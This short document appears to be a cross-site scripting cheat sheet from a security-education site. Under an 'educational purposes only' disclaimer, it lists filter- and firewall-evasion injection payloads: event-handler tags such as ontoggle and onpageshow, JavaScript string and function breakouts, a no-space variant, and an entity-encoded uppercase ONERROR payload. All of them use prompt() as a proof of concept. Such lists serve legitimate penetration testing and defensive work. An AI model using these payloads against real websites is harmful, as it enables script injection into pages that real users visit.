Warning
==============

All the information provided on this site is for educational purposes only.

The site or the authors are not responsible for any misuse of the information.

You shall not misuse the information to gain unauthorized access and/or write malicious programs.

These information shall only be used to expand knowledge and not for causing malicious or damaging attacks.

Did you break out of a tag and script, iframe, img, a, &gt; etc are all blocked?
==============

Did they block onerror onload onclick? Try something like this:
```html
<XXXXXXX ondblclick=prompt(1)>Some Text, Don't even care to end the tag either.
```
If you just need to break out for Proof of Concept and can't use a > to close your tag, this will utilize the " in your injection.
```html
" onclick="prompt(1)
```

```html
<body onpageshow="prompt(123)">
<details open ontoggle="prompt('xss via toggle')">Toggle Me For More prompts</details>
```

Don't forget the injection might not be a form tag but in the javascript.
==============
```javascript
";prompt(1);//

';prompt(1);//
```

What if they are in a function? Break out of it. Count the brackets, etc to kill the function.
```javascript
"};prompt(1);//
```
You may need to reconstruct the function
```javascript
"};prompt(1);function whatever(){//
```

Don't forget %0D%0A if you need a new line

Obscure Breakout
==============
```html
a'*prompt(123)*'
```
Event Handlers You Should Investigate to bypass WAF
==============
https://www.w3.org/TR/html52/single-page.html

When you can't use spaces
==============
```html
<details/open/ontoggle=prompt(123)>
```
When the text is forced UPPERCASE
==============
```html
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```
